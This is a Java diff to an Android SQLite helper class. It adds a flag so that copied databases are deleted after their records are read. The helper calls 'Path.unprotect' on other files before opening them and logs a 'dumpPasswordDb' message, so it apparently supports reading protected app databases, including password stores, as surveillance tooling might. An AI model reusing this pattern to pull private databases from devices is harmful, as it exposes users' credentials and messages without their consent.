@@ -28,11 +28,13 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	private static final String TAG = "GenericSqliteHelper";
 	private static final int DB_VERSION = 4;
 	public static Object lockObject = new Object();
-	private String name;
+	private String name = null;
 	private SQLiteDatabase db;
+	private boolean deleteAtEnd = false;
 
-	private GenericSqliteHelper(String name) {
+	private GenericSqliteHelper(String name, boolean deleteAtEnd) {
 		this.name = name;
+		this.deleteAtEnd = deleteAtEnd;
 	}
 
 	public GenericSqliteHelper(SQLiteDatabase db) {
@@ -58,7 +60,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 
 	public static GenericSqliteHelper open(File fs) {
 		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath())) {
-			return new GenericSqliteHelper(fs.getAbsolutePath());
+			return new GenericSqliteHelper(fs.getAbsolutePath(), false);
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
@@ -75,10 +77,12 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	 * @return
 	 */
 	public static GenericSqliteHelper openCopy(String dbFile) {
+		
 		File fs = new File(dbFile);
 
-		if(fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath()) && fs.canRead()) {
-			//if(Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath()))
+		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath()) && fs.canRead()) {
+			// if(Path.unprotect(fs.getParent()) &&
+			// Path.unprotect(fs.getAbsolutePath()))
 			dbFile = fs.getAbsolutePath();
 		} else {
 			if (Cfg.DEBUG) {
@@ -94,7 +98,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 			return null;
 		}
 
-		return new GenericSqliteHelper(localFile);
+		return new GenericSqliteHelper(localFile, true);
 
 	}
 
@@ -147,7 +151,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 				long id = visitor.cursor(cursor);
 				maxid = Math.max(id, maxid);
 			}
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (traverseRecords) maxid: " + maxid);
 			}
@@ -158,8 +162,8 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 			if (this.db == null) {
 				db.close();
 			}
-			
-			if(this.name != null){
+
+			if (this.deleteAtEnd) {
 				File file = new File(this.name);
 				file.delete();
 			}
